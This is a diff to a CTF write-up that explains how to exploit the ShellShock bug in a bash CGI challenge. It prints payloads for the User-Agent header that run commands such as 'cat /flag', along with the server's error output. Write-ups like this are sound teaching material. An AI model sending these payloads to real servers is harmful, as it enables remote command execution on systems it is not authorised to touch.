@@ -9,8 +9,8 @@ You know i am a little noob in web developing. so i just started to create a sim
 
 ##SimpleWeb-Solution
 
-The challenge is created using bash and cgi. It is very simple and and contains nothing just a bunch of static pages. 
-There is a hint is description of challenge that says: ```... But yesterday this crazy friend of mine shocked me to death ....``` and will remind of ShellShock vulnerability that could lead to code execution on server running bash.
+The challenge is created using bash and cgi. It is very simple and contains nothing just a bunch of static pages. 
+There is a hint in description of challenge that says: ```... But yesterday this crazy friend of mine shocked me to death ....``` and will remind us the ShellShock vulnerability that could lead to code execution on server running bash.
 
 One of the methods to exploit using shellshock, is setting shellshock magic code ```() { :; };``` in user-agent field of http-request-header.
 So let's test it. 
@@ -21,7 +21,23 @@ fire up something like tamper-data or burpsuite and set code below in user-agent
 () { :; } ; /bin/bash -c "cat /flag"
 ```
 
-And we will get a error result and will not see was is in ```/flag``` file. running some other commands, we can see that using ```ping``` will give us a huge hint:
+we will get a error result and will not see was is in ```/flag``` file.
+
+```html
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error or
+misconfiguration and was unable to complete
+your request.</p>
+<p>Please contact the server administrator at 
+ webmaster@localhost to inform them of the time this error occurred,
+ and the actions you performed just before this error.</p>
+<p>More information about this error may be available
+in the server error log.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at 192.168.32.136 Port 80</address>
+```
+
+running some other commands, we can see that using ```ping``` will give us a huge hint:
 
 ```
 () { :; } ; /bin/bash -c "ping -c 10 google.com"
